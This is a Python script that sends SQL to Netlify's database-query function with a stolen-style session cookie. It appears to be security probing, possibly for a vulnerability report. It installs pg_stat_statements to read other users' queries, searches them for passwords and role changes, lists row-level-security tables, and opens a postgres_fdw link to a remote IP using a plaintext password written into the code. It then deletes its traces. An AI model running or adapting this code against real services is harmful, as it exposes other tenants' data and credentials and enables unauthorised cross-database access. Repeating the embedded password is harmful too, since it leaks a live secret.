# -*- coding: utf-8 -*-
"""技术层测试 7:
1. pg_stat_statements 可装 → 能否看到其他 userid 的语句(控制面 SQL 情报)
2. RLS 表检查(bypassrls=true 的价值)
3. FDW host=IP(B 公网 IP 3.147.243.31)直连——DNS vs IP 限制判定
清理"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:2200].decode('utf-8', 'ignore')
    conn.close()
    return st, out


print('== 1. pg_stat_statements ==')
st, out = q('create extension if not exists pg_stat_statements')
print('install [%d] %s' % (st, out[:200]))
st, out = q("select dbid, datname, userid::regrole, count(*), max(length(query)) from pg_stat_statements "
            "group by 1,2,3 order by 4 desc limit 30")
print('stat 总览 [%d] %s' % (st, out[:1500]))
st, out = q("select datname, userid::regrole, left(query, 150) as q, calls from pg_stat_statements "
            "where userid::regrole::text <> 'netlifydb_owner' order by calls desc limit 20")
print('其他 user 语句 [%d] %s' % (st, out[:1800]))
st, out = q("select datname, userid::regrole, left(query, 200) as q from pg_stat_statements "
            "where query ilike '%password%' or query ilike '%create role%' or query ilike '%alter role%' "
            "or query ilike '%create extension%' limit 15")
print('敏感类语句 [%d] %s' % (st, out[:1800]))

print()
print('== 2. RLS 表 ==')
st, out = q("select n.nspname||'.'||c.relname from pg_class c join pg_namespace n on c.relnamespace=n.oid "
            "where c.relrowsecurity and n.nspname not in ('pg_catalog','information_schema')")
print('[%d] %s' % (st, out[:800]))

print()
print('== 3. FDW IP 直连 B ==')
steps = [
    ("create server ip", "create server if not exists srv_ip foreign data wrapper postgres_fdw options (host '3.147.243.31', port '5432', dbname 'netlifydb')"),
    ("user mapping", "create user mapping if not exists for netlifydb_owner server srv_ip options (user 'netlifydb_owner', password 'npg_TWUSd2Mavu7G')"),
    ("ft", "create foreign table if not exists ft_ip(id int) server srv_ip options (schema_name 'public', table_name 'k_probe')"),
    ("read", 'select * from ft_ip'),
    ("clean ft", 'drop foreign table if exists ft_ip'),
    ("clean um", 'drop user mapping if exists for netlifydb_owner server srv_ip'),
    ("clean srv", 'drop server if exists srv_ip'),
]
for desc, sql in steps:
    st, out = q(sql, timeout=30)
    print('%-12s [%d] %s' % (desc, st, out[:250]))
print()
print('== 清理 pss ==')
st, out = q('drop extension if exists pg_stat_statements cascade')
print('[%d] %s' % (st, out[:200]))
